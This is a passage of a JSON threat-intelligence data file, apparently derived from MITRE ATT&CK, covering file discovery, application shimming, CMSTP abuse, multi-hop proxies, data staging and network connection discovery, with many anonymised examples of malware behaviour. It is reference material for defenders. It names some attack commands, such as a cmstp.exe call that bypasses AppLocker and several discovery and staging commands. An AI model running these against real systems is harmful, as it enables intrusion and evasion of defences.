      "searches victim drives for files matching certain extensions (.skr.pkr or .key) or names.",
      "has the ability to get directory listings or drive information on a compromised host.",
      "has used the find command to search for specific files.",
      "has searched for folders associated with antivirus software.",
      "can list all files and their associated attributes including filename type owner creation time last access time last write time size and permissions.",
      "can list directory entries.",
      "has a module to enumerate drives and find files recursively.",
      "examines files prior to encryption to determine if they meet requirements for encryption and can be encrypted by the ransomware. These checks are performed through native Windows functions such as GetFileAttributesW.",
      "has the ability to list files and file characteristics including extension size ownership and permissions.",
      "can enumerate the victim's desktop.",
      "contains commands to list files and directories as well as search for files matching certain extensions from a defined list.",
      "gathers information on victims drives and has a plugin for document listing.",
      "can use DirectoryList to enumerate files in a specified directory.",
      "can search for and collect data from specific Chrome Opera Microsoft Edge and Firefox files including any folders that have the string `Profile` in its name.",
      "During  the threat actors conducted a file listing discovery against multiple hosts to ensure locker encryption was successful.",
      "has the ability to search for files.",
      "has used the FindNextFile command as part of its file deletion process.",
      "During  the threat actors used a malicious DLL to search for files with specific keywords.",
      "macros can scan for Microsoft Word and Excel files to inject with additional malicious macros.  has also used its backdoors to automatically list interesting files (such as Office documents) found on a system.",
      "can search for specific files and list directories.",
      "can perform a recursive directory listing for all volume drives available on the victim's machine and can also fetch specific files by their paths.",
      "is capable of running commands to obtain a list of files and directories as well as enumerating logical drives.",
      "can check for the presence of specific files prior to moving to the next phase of execution.",
      "collects information from the victim including installed drivers programs previously executed by users programs and services configured to automatically run at startup files and folders present in any user's home folder files and folders present in any user's My Documents programs installed to the Program Files folder and recently accessed files folders and programs.",
      "has searched for files on the system such as documents located in the desktop folder.",
      "During  the threat actors used `dir c:\\\\` to search for files.",
      "can browse file systems using a file manager module.",
      "has the ability to enumerate the users home directory and the path to its own application bundle.",
      "has used a batch script to gather folder and file names from victim hosts.",
      "can search through folders and files on the system.",
      "has a command to traverse the files and directories in a given path.",
      "can enumerate files on a target system.",
      "has commands to get the current directory name as well as the size of a file. It also has commands to obtain information about logical drives drive type and free space.",
      "has the ability to identify folders and files related to previous infections.",
      "can enumerate storage volumes and folder contents of a compromised host.",
      "can look for files carrying specific extensions such as: .rtf .doc .docx .xls .xlsx .ppt .pptx .pps .ppsx .txt .gpg .pkr .kdbx .key and .jpb.",
      "recursively searches for all .doc files on the system and collects a directory listing of the Desktop %TEMP% and %WINDOWS%\\Temp directories.",
      "can browse directories on a compromised host.",
      "has the ability to list the directories on a compromised host.",
      "has enumerated files and folders on all mounted drives.",
      "can identify whether it has been run previously on a host by checking for a specified folder.",
      "has the ability to list files upon receiving the ls command from C2.",
      "can locate files based on hardcoded file extensions.",
      "has the capability to identify the drive type on a victim.",
      "have enumerated files and directories or searched in specific locations within a compromised host.",
      "has used  to locate PDF Excel and Word documents during collection. The group also searched a compromised DCCC computer for specific terms.",
      "has a command to search for files on the victims machine.",
      "checks its current working directory upon execution and also contains watchdog functionality that ensures its executable is located in the correct path (else it will rewrite the payload).",
      "has the ability to list drives on the infected host.",
      "gathers a list of installed apps from the uninstall program Registry. It also gathers registered mail browser and instant messaging clients from the Registry.  has searched for given file types.",
      "can use a file monitor to identify .lnk .doc .docx .xls .xslx and .pdf files.",
      "searches for variety of user files by file extension before encrypting them using RSA and AES including Office PDF image audio video source code archive/compression format and key and certificate files.",
      "has the ability to list directories.",
      "is capable of identifying documents on the victim with the following extensions: .doc; .pdf .csv .ppt .docx .pst .xls .xlsx .pptx and .jpeg.",
      "can search for files in directories.",
      "used a file listing plugin to collect information about file and directories both on local and remote drives.",
      "can detect the victim's file or folder list.",
      "has searched for specific files prior to encryption.",
      "can list files and directories with the `ls` `lsd` and `lsl` commands.",
      "has the ability to search for specific files.",
      "has the ability to enumerate files and directories on a compromised host.",
      "has checked for the existence of specific files including /usr/sbin/setenforce and /etc/selinux/config. It also has the ability to monitor the cryptocurrency miner file and process.",
      "can browse the file system.",
      "has a command to open a file manager and explorer on the system.",
      "can collect the names of all files and folders in the Program Files directories.",
      "has the ability to discover drive information on the infected host.",
      "collects a list of files and directories in C:\\ with the command dir /s /a c:\\ >> C:\\windows\\TEMP\\[RANDOM].tmp.",
      "has the ability to enumerate directory content.",
      "can search for specific files on an infected host.",
      "has been observed enumerating system drives and partitions.",
      "has utilized multiple commands to identify data of interest in file and directory listings.",
      "searches for files with specific file extensions.",
      "allows adversaries to enumerate and modify the infected host's file system. It supports searching for directories creating directories listing directory contents reading and writing to files retrieving file attributes and retrieving volume information.",
      "can search files on a compromised host.",
      "has used dir to search for programfiles and appdata.",
      "actors used the following commands after exploiting a machine with  malware to obtain information about files and directories: dir c:\\ >> %temp%\\download dir c:\\Documents and Settings >> %temp%\\download dir c:\\Program Files\\ >> %temp%\\download dir d:\\ >> %temp%\\download",
      "can parse the available drives and directories to determine which files to encrypt.",
      "has looked for files in the user's home directory with wallet in their name using find.",
      "can use loop operations to enumerate directories on a compromised host.",
      "had commands to enumerate files and directories.",
      "can enumerate files by using a variety of functions.",
      "has enumerated files on a compromised host.",
      "finds a specified directory lists the files and metadata about those files.",
      "contains the readFiles function to return a detailed listing (sometimes recursive) of a specified directory.  contains the showBackupIosFolder function to check for IOS device backups by running ls -la ~/Library/Application\\ Support/MobileSync/Backup/.",
      "can enumerate common folders such as My Documents Desktop and AppData.",
      "can use the Linux API `statvfs` to enumerate the current working directory.",
      "has the ability to enumerate files on a compromised host in order to encrypt files with specific extensions.",
      "can enumerate specific files for encryption.",
      "can explore files on a compromised system.",
      "has the ability to enumerate file and folder names.",
      "s data wiper component enumerates specific files on all the Windows drives.",
      "gathers file and directory information from the victims machine.",
      "can extract drive information from the endpoint and search files on the system.",
      "has the ability to search for files on the compromised host.",
      "has used malware to collect information on files and directories.",
      "searches through the drive containing the OS then all drive letters C through to Z for documents matching certain extensions.",
      "can collect information on the Windows directory and searches for compressed RAR files on the host.",
      "enumerated the Orion software Visual Studio solution directory path.",
      "can enumerate files on a compromised host.",
      "can retrieve a file listing from the system.",
      "can enumerate local drives.",
      "can discover files on a local system.",
      "has the ability to search for files in specified directories.",
      "can monitor the file system to identify files less than 6.4 MB in size with file extensions including .doc .docx .xls .xlsx .ppt .pptx .pdf .rtf .tif .odt .ods .odp .eml and .msg.",
      "has the ability to browse files in directories such as Program Files and the Desktop.",
      "will survey the contents of system files during installation.",
      "can enumerate drives and list the contents of the C: drive on a victim's computer.",
      "has the ability to identify specific files and directories that are not to be encrypted.",
      "During the   obtained information about the configured Exchange virtual directory using `Get-WebServicesVirtualDirectory`.",
      "includes various modules for finding files of interest on hosts and network shares.",
      "Spider enumerates a target organization for files and directories of interest including source code.",
      "can retrieve data from specific Windows directories as well as open random files as part of .",
      "has run scripts to identify file formats including Microsoft Word.",
      "has monitored files' modified time.",
      "collects the volumes mapped on the system and also steals files with the following extensions: .docx .doc .pptx .ppt .xlsx .xls .rtf and .pdf.",
      "has a command to list files on a system.",
      "has used malware that checked if the ProgramData folder had folders or files with the keywords Kasper Panda or ESET.",
      "can enumerate files and directories on a compromised host.",
      "can enumerate files on the local file system and includes a module for enumerating recently accessed files.",
      "searches for files ending with dozens of different file extensions prior to encryption.",
      "can obtain file and directory information.",
      "can search for specific files and directories on a machine.",
      "can use a specific module for file enumeration.",
      "can browse file systems.",
      "has searched folders and subfolders for files to encrypt.",
      "has included a program ExeProtector which monitors for the existence of  on the infected system and redownloads if necessary.",
      "can search for specific file extensions including zipped files.",
      "can search the C:\\Windows\\Microsoft.NET\\ directory for files of a specified size.",
      "has searched for files on the infected host.",
      "can enumerate all files and directories on a compromised host.",
      "uses a driver to scan for specific filesystem driver objects.",
      "An older version of  has a module that monitors all mounted volumes for files with the extensions .doc .docx .pgp .gpg .m2f or .m2o.",
      "searches for files that are 60mb and less and contain the following extensions: .doc .docx .xls .xlsx .ppt .pptx .exe .zip and .rar.  also runs the echo %APPDATA% command to list the contents of the directory.  can obtain the current execution path as well as perform drive enumeration.",
      "has searched for files and directories on a compromised network.",
      "malware can list a victim's logical drives and the type as well the total/free space of the fixed devices. Other malware can list a directory's contents.",
      "has the ability to list drives and files on the compromised host.",
      "has used DriveLetterView to enumerate drive information.",
      "has the ability to recursively enumerate files on an infected endpoint.",
      "can parse the hard drive on a compromised host to identify specific file extensions.",
      "can search files on the target host by extension including doc docx xls rtf odt txt jpg pdf rar zip and 7z.",
      "has the ability to gather a list of files and directories on the infected system.",
      "has used a script that checks `/proc/*/environ` for environment variables related to AWS.",
      "has the ability to retrieve a list of files in a given directory as well as drives and drive types.",
      "can identify specific files for exfiltration.",
      "has resolved the path of a process PID to use as a script argument.",
      "can find and append specific files on Ivanti Connect Secure VPNs based upon received commands.",
      "can obtain a list of directories.",
      "has the ability to find files on the targeted system.",
      "can specify the local file path to upload files from.",
      "has used malware that scans for files in the Documents Desktop and Download folders and in other drives.",
      "During  threat actors gathered a recursive directory listing to find files and directories of interest.",
      "has a command to launch a file browser or explorer on the system.",
      "can list files on available disk volumes.",
      "lists files on the victims machine.",
      "has several commands to search directories for files.",
      "has used the command appDir=$(dirname $(dirname $currentDir)) and $(dirname $(pwd -P)) to construct installation paths.",
      "has the ability to search the compromised host for files.",
      "can be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension name and/or age)",
      "can scan a directory to identify files for deletion.",
      "Some versions of  search for the hard-coded folder C:\\Program Files\\e Carte Bleue.",
      "is capable of listing files folders and drives on a victim.",
      "During   conducted word searches within documents on a compromised host in search of security and financial matters.",
      "backdoor possesses the capability to list files and directories on a machine.",
      "has searched the entire target system for DOC DOCX PPT PPTX XLS XLSX and PDF files.",
      "can recursively enumerate files in an operator-provided directory.",
      "can use a file exfiltration tool to collect recently changed files with specific extensions.",
      "can list information about files in a directory and recently opened or used documents.  can also search for specific files by supplied file mask.",
      "During  threat actors used  to establish full remote control of the connected machine and browse the victim file system.",
      "lists the directories for Desktop program files and the users recently accessed files.",
      "has the ability to search for .txt .ppt .hwp .pdf and .doc files in specified directories.",
      "can discover specified filetypes and log files on a targeted system.",
      "loader can check for the  backdoor .pri file on a compromised AD FS server.",
      "can obtain victim drive information as well as a list of folders in C:\\Program Files.",
      "searches for various filesystem paths to determine what banking applications are installed on the victims machine.",
      "can enumerate files and directories just prior to encryption.",
      "collects information about available drives default browser desktop file list My Documents Internet history program files and root of available drives. It also searches for ICS-related software files.",
      "is capable of obtaining directory file and drive listings.",
      "searches for the Kubernetes config file and other related files using a regular expression.",
      "has used tools with the ability to search for files on a compromised host.",
      "has run scripts to enumerate recently modified documents having either a .pdf .doc .docx .xls or .xlsx extension.",
      "has a command to upload to its C2 server information about files on the victim mobile device including SD card size installed app list SMS content contacts and calling history.",
      "can enumerate files and collect associated metadata.",
      "can parse collected files to identify specific file extensions.",
      "malware can use a common function to identify target files by their extension and some also enumerate files and directories including a Destover-like variant that lists files and gathers information for all drives.",
      "has several modules such as `ls.py` `pwd.py` and `recentFiles.py` to enumerate directories and files.",
      "has used malware that searched for files with specific patterns.",
      "has the ability to index files from drives user profiles and removable drives.",
      "can traverse the file system to discover files to encrypt by identifying specific extensions defined in a hardcoded list.",
      "can enumerate files and directories on a target machine.",
      "creates a backdoor through which remote attackers can check for the existence of files including its own components as well as retrieve a list of logical drives.",
      "can search for specific files.",
      "has searched compromised systems for folders of interest including those related to HR audit and expense and meeting memos.",
      "can search read write move and execute files.",
      "searches the system for all of the following file extensions: .avi .mov .mkv .mpeg .mpeg4 .mp4 .mp3 .wav .ogg .jpeg .jpg .png .bmp .gif .tiff .ico .xlsx and .zip. It can also obtain browsing history cookies and plug-in information.",
      "can search for files on the infected machine.",
      "can search for files and directories.",
      "can retrieve file listings from the victim machine.",
      "has the ability to gather metadata from a file and to search for file and directory names.",
      "has the ability to enumerate all files and directories on an infected system.",
      "can collect directory and file lists.",
      "The  Directory Lister module can list information about files and directories including creation time last write time name and size.",
      "has the ability to collect drive and file information on an infected machine.",
      "has searched file contents on a compromised host.",
      "can enumerate information about files from the infected system including file size attributes creation time last access time and write time.  can enumerate the compilation timestamp of Windows executable files.",
      "can use the command code do_vslist to send file names size and status to C2.",
      "produces file listings in order to search for files to be exfiltrated.",
      "can check for specific files and directories associated with virtualization and malware analysis.",
      "A version of  searches for filenames created with a previous version of the malware suggesting different versions targeted the same victims and the versions may work together.",
      "has used a file stealer that checks the Document Downloads Desktop and Picture folders for documents and images with specific extensions.",
      "can enumerate directories on a compromise host.",
      "has executed file /bin/pwd on exploited victims perhaps to return architecture related information.",
      "has used a program named ff.exe to search for specific documents on compromised hosts.",
      "identifies specific files and directories in the Linux operating system associated with storage devices.",
      "can search a compromised host for specific files.",
      "can list files and directories on a compromised host.",
      "has used `mdfind` to enumerate a list of apps known to grant screen sharing permissions.",
      "can recursively search for files in folders and collects files from the desktop with certain extensions.",
      "can parse `/proc/process_name/cmdline` to look for the string `dswsd` within the command line.",
      "searches for files on the system.",
      "has used a script to check for the presence of files created by OpenSSH backdoors.",
      "can execute enum to enumerate files in storage on a compromised system.",
      "can search for log and VMware-related files with .log .vmdk .vmem .vswp and .vmsn extensions.",
      "can list files information for specific directories.",
      "A module in  collects information about the paths size and creation time of files with specific file extensions but not the actual content of the file.",
      "can scan directories on a compromised host.",
      "has a dynamic debugging feature to check whether it is located in the %TEMP% directory otherwise it copies itself there.",
      "searches for specific directories on the victims machine.",
      "can enumerate directories on target machines.",
      "can list directories.",
      "has used the BLOODMINE utility to discover files with .css .jpg .png .gif .ico .js and .jsp extensions in Pulse Secure Connect logs.",
      "can monitor for system upgrade events by checking for the presence of `/tmp/data/root/dev`.",
      "has used WizTree to obtain network files and directory listings.",
      "can search for a specific file on the compromised computer and can enumerate files in Desktop Downloads and Documents folders.",
      "can identify specific files and directories to exclude from the encryption process.",
      "has searched the Program Files directories for specific folders and has searched for strings related to its mutexes.",
      "can identify recently opened files by using an LNK format parser to extract the original file path from LNK files found in either `%USERPROFILE%\\Recent` (Windows XP) or `%APPDATA%\\Microsoft\\Windows\\Recent` (newer Windows versions) .",
      "can enumerate files for encryption.",
      "identifies files with certain extensions from USB devices then copies them to a predefined directory.",
      "scans the victim for files that contain certain keywords and document types including PDF DOC DOCX XLS and XLSX from a list that is obtained from the C2 as a text file. It can also identify logical drives for the infected machine.",
      "has used the Windows `dir` command to enumerate files and directories in a victim's network.",
      "checks for the existence of two configuration files (keyword_parm.txt and parm.txt) and attempts to read the files every 30 seconds.",
      "surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory the current user's desktop the Program Files directory and Recent.  RPC backdoors have also searched for files matching the lPH*.dll pattern.",
      "has the ability to enumerate files on a targeted system.",
      "server component can list directory contents.",
      "can identify files with .doc .docx .ppt .pptx .xls .xlsx and .pdf extensions and specific timestamps for collection.",
      "has collected a list of files from the victim and uploaded it to its C2 server and then created a new list of specific files to steal.",
      "can search for specific files on a compromised system.",
      "can search directories for files on the victims machine.",
      "has enumerated directories containing vulnerability testing and cyber related content and facilities data such as construction drawings.",
      "has the ability to retrieve directory listings.",
      "has searched for and collected files on local and network drives.",
      "has the ability to enumerate directories for files that match a set list.",
      "can collect desktop filenames.",
      "can search for files associated with specific applications.",
      "can list filesystem contents on targeted systems.",
      "can gather information about specific files on the victim system.",
      "will check to see if the initial executing script is located on the user's Desktop as an anti-analysis check.",
      "can search its staging directory for output files it has produced.",
      "can receive command line arguments to encrypt specific files and directories.",
      "can avoid encrypting files with a .PLAY .exe .msi .dll .lnk or .sys file extension.",
      "has used the Grixba information stealer to list security files and processes.",
      "can enumerate files on infected devices and avoid encrypting files with .exe .dll .sys .lnk or . lck extensions.",
      "gathers a list of filenames from the following locations during execution of the final botnet stage: \\/usr\\/sbin\\/ \\/usr\\/bin\\/ \\/sbin\\/ \\/pfrm2.0\\/bin\\/ \\/usr\\/local\\/bin\\/.",
      "delivered malicious JavaScript payloads capable of listing folders and emails in exploited email servers.",
      "generates a list of all files and paths on the fixed drives of an infected system enumerating all files on the system except specific folders defined in a hardcoded list.",
      "identifies target files and directories for collection based on a configuration file.",
      "has enumerated local files and folders on victim devices.",
      "can enumerate the contents of current working or other specified directories.",
      "can exclude files associated with core system functions from encryption.",
      "can list information of all files in the system recursively from the root directory or from a specified directory.",
      "enumerates all document files on an infected machine then creates a summary of these items including filename and directory location prior to exfiltration to cloud hosting services.",
      "uses the `NSFileManager` to move create and delete files.  can also use the assembly `bt` instruction to determine a file's executable permissions.",
      "can enumerate and collect items from local drives and folders.",
      "can identify the current working directory.",
      "has used commands such as `dir` to examine the local filesystem of victim machines.",
      "has the ability to only encrypt specific files.",
      "can target specific files and folders for encryption.",
      "collects information about directory and file structures including total number of subdirectories total number of files and total size of files on infected systems.",
      "can identify specific files and directories within the Linux operating system corresponding with storage devices for follow-on wiping activity similar to .",
      "has used `mdfind` to enumerate a list of apps known to grant screen sharing permissions and leverages a module to run the command `ls -la ~/Desktop`.",
      "can ignore specified directories for encryption.",
      "can be configured to exfiltrate specific file types."
    ],
    "id": "T1083",
    "name": "File and Directory Discovery",
    "similar_words": [
      "File and Directory Discovery"
    ]
  },
  "attack-pattern--7c93aa74-4bc0-4a9e-90ea-f25f86301566": {
    "description": "The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Endgame Process Injection July 2017) Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses [Hooking](https://attack.mitre.org/techniques/T1179) to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* %WINDIR%\\AppPatch\\sysmain.sdb\n* hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb\n\nCustom databases are stored in:\n\n* %WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom\n* hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) (UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress). Similar to [Hooking](https://attack.mitre.org/techniques/T1179), utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.",
    "example_uses": [
      "has used application shim databases for persistence."
    ],
    "id": "T1138",
    "name": "Application Shimming",
    "similar_words": [
      "Application Shimming"
    ]
  },
  "attack-pattern--7d6f590f-544b-45b4-9a42-e0805f342af3": {
    "description": "The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1117) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.\n\nCMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)",
    "example_uses": [
      "has used the command cmstp.exe /s /ns C:\\Users\\ADMINI~W\\AppData\\Local\\Temp\\XKNqbpzl.txt to bypass AppLocker and launch a malicious script.",
      "has used CMSTP.exe and a malicious INF to execute its  payload."
    ],
    "id": "T1191",
    "name": "CMSTP",
    "similar_words": [
      "CMSTP"
    ]
  },
  "attack-pattern--7d751199-05fa-4a72-920f-85df4506c76c": {
    "description": "To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.",
    "example_uses": [
      "uses a copy of tor2web proxy for HTTPS communications.",
      "downloads and installs Tor via homebrew.",
      "uses Tor for command and control.",
      "A backdoor used by  created a Tor hidden service to forward traffic from the Tor client to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB) enabling full remote access from outside the network.",
      "Traffic traversing the  network will be forwarded to multiple nodes before exiting the  network and continuing on to its intended destination."
    ],
    "id": "T1188",
    "name": "Multi-hop Proxy",
    "similar_words": [
      "Multi-hop Proxy"
    ]
  },
  "attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e": {
    "description": "Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017)In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.",
    "example_uses": [
      "determines a working directory where it stores all the gathered data about the compromised machine.",
      "created a directory named \"out\" in the user's %AppData% folder and copied files to it.",
      "adds collected files to a temp.zip file saved in the %temp% folder, then base64 encodes it and uploads it to control server.",
      "copied all targeted files to a directory called index that was eventually uploaded to the C&C server.",
      "uses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.",
      "writes multiple outputs to a TMP file using the >> method.",
      "stores information gathered from the endpoint in a file named 1.hwp.",
      "stages the output from command execution and collected files in specific folders before exfiltration.",
      "stages collected data in a text file.",
      "stores the gathered data from the machine in .db files and .bmp files under four separate locations.",
      "stages command output and collected data in files before exfiltration.",
      "aggregates collected data in a tmp file.",
      "has used C:\\Windows\\Debug and C:\\Perflogs as staging directories.",
      "aggregates staged data from a network into a single location.",
      "scripts save memory dump data into a specific directory on hosts in the victim environment.",
      "has been known to stage files for exfiltration in a single location.",
      "Data captured by  is placed in a temporary file under a directory named \"memdump\".",
      "creates folders to store output from batch scripts prior to sending the information to its C2 server.",
      "stores output from command execution in a .dat file in the %TEMP% directory.",
      "stages data it copies from the local system or removable drives in the \"%WINDIR%\\$NtUninstallKB885884$\\\" directory.",
      "creates various subdirectories under %Temp%\\reports\\% and copies files to those subdirectories. It also creates a folder at C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\store to store screenshot JPEG files.",
      "stages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin.",
      "copies documents under 15MB found on the victim system to is the user's %temp%\\SMB\\ folder. It also copies files from USB devices to a predefined directory.",
      "Modules can be pushed to and executed by  that copy data to a staging area, compress it, and XOR encrypt it.",
      "can create a directory (C:\\ProgramData\\Mail\\MailAg\\gl) to use as a temporary directory for uploading files.",
      "collects files matching certain criteria from the victim and stores them in a local directory for later exfiltration.",
      "creates a directory, %USERPROFILE%\\AppData\\Local\\SKC\\, which is used to store collected log files.",
      "copies files from removable drives to C:\\system.",
      "identifies files with certain extensions and copies them to a directory in the user's profile.",
      "saves information from its keylogging routine as a .zip file in the present working directory.",
      "TRINITY malware used by  identifies payment card track data on the victim and then copies it to a local file in a subdirectory of C:\\Windows\\. Once the malware collects the data,  actors compressed data and moved it to another staging system before exfiltration.",
      "malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory, then compressed, encrypted, and uploaded to a C2 server.",
      "has staged encrypted archives for exfiltration on Internet-facing servers that had previously been compromised with .",
      "has stored captured credential information in a file named pi.log.",
      "has collected and staged credentials and network enumeration information using the networkdll and psfin  modules.",
      "has staged collected data in password-protected archives.",
      "can write captured SSH connection credentials to a file under the /var/run directory with a .pid extension for exfiltration.",
      "can create directories to store logs and other collected data.",
      "has the ability to stage data prior to exfiltration.",
      "stages data in a centralized database prior to exfiltration.",
      "has stored information in folders named `U1` and `U2` prior to exfiltration.",
      "has staged data on compromised hosts prior to exfiltration."
    ],
    "id": "T1074",
    "name": "Data Staged",
    "similar_words": [
      "Data Staged"
    ]
  },
  "attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475": {
    "description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.Utilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and lsof can be used to list current connections. who -a and w can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g. show ip sockets, show tcp brief).(Citation: US-CERT-TA18-106A) On ESXi servers, the command `esxi network ip connection list` can be used to list active network connections.(Citation: Sygnia ESXi Ransomware 2025)",
    "example_uses": [
      "uses netstat -ano to search for specific IP address ranges.",
      "executes the netstat -ano command.",
      "collects a list of active and listening connections by using the command netstat -nao as well as a list of available network mappings with net use.",
      "uses the netstat command to find open ports on the victim’s machine.",
      "can gather information about TCP connection state.",
      "has a built-in utility command for netstat, can do net session through PowerView, and has an interactive shell which can be used to discover additional information.",
      "has a tool that can enumerate current network connections.",
      "has used netstat -an on a victim to get a listing of network connections.",
      "enumerates the current network connections similar to  net use .",
      "may collect active network connections by running netstat -an on a victim.",
      "uses  to list TCP connection status.",
      "can be used to discover current NetBIOS sessions.",
      "has gathered information about local network connections using .",
      "The discovery modules used with  can collect information on network connections.",
      "Commands such as net use and net session can be used in  to gather information about network connections from a particular host.",
      "may use netstat -ano to display active network connections.",
      "can be used to enumerate local network connections, including active TCP connections and other network statistics.",
      "can enumerate drives and Remote Desktop sessions.",
      "can obtain a list of active connections and open ports.",
      "has used net use to conduct internal discovery of systems. The group has also used quser.exe to identify existing RDP sessions on a victim.",
      "has used net use to conduct connectivity checks to machines.",
      "obtains and saves information about victim network interfaces and addresses.",
      "actors used the following command following exploitation of a machine with  malware to display network connections: netstat -ano >> %temp%\\download",
      "surveys a system upon check-in to discover active local network connections using the netstat -an, net use, net file, and net session commands.",
      "performs local network connection discovery using netstat.",
      "can identify the IP and port numbers for all remote connections from the compromised host.",
      "can use  to collect a list of network connections.",
      "can use WNetOpenEnumW and WNetEnumResourceW to enumerate files in network resources for encryption.",
      "installed a port monitoring tool MAPMAKER to print the active TCP connections on the local system.",
      "used the Windows function GetExtendedUdpTable to detect connected UDP endpoints.",
      "uses netstat -aon to gather network connection information.",
      "contains an implementation of  to enumerate TCP and UDP connections.",
      "During  threat actors collected a list of open connections on the infected system using `netstat` and checks whether it has an internet connection.",
      "uses the netstat command to find open ports on the victims machine.",
      "can be used to enumerate local network connections including active TCP connections and other network statistics.",
      "has used net session on the victim's machine.",
      "has run netstat -anp to search for rival malware connections.  has also used `libprocesshider` to modify /etc/ld.so.preload.",
      "has used the netstat -naop tcp command to display TCP connections on a victim's machine.",
      "has used netstat -ano to determine network connection information.",
      "can discover active sessions for a targeted system.",
      "has used the WNetOpenEnumW WNetEnumResourceW WNetCloseEnum and WNetAddConnection2W functions to enumerate the network resources on the infected machine.",
      "surveys a system upon check-in to discover active local network connections using the netstat -an net use net file and net session commands.  RPC backdoors have also enumerated the IPv4 TCP connection table via the GetTcpTable2 API call.",
      "uses the netstat -r and netstat -an commands.",
      "uses the netsh wlan show networks mode=bssid and netsh wlan show interfaces commands to list all nearby WiFi networks and connected interfaces.",
      "can use `WTSEnumerateSessionsW` to monitor remote desktop connections.",
      "can produce a sessions report from compromised hosts.",
      "can collect network and active connection information.",
      "has used `netstat -ano` on compromised hosts to enumerate network connections.",
      "had gathered user IP address and server data related to RDP sessions on a compromised host. It has also accessed network diagram files useful for understanding how a host's network was configured.",
      "uses the net use net session and netstat commands to gather information on network connections.",
      "Once inside a Virtual Private Cloud  can attempt to identify DirectConnect VPN or VPC Peering.",
      "can enumerate all connected drives.",
      "can use the GetExtendedTcpTable function to retrieve information about established TCP connections.",
      "can use the function GetIpNetTable to recover the last connections to the victim's machine.",
      "can capture session logon details from a compromised host.",
      "enumerates the current network connections similar to net use .",
      "has used  to find RPC connections on remote machines.",
      "used the net use command to get a listing on network connections.",
      "can use API hooks on `GetExtendedTcpTable` to retrieve a table containing a list of TCP endpoints available to the application.",
      "has a module for enumerating TCP and UDP network connections and associated processes using the netstat command.",
      "has used `netstat -anop tcp` to discover TCP connections to compromised hosts.",
      "has used quser.exe to identify existing RDP connections.",
      "has used netstat -ano | findstr EST to discover network connections.",
      "has used a PowerShell backdoor to check for Skype connections on the target machine.",
      "can enumerate open ports on a victim machine.",
      "used netstat -oan to obtain information about the victim network connections.",
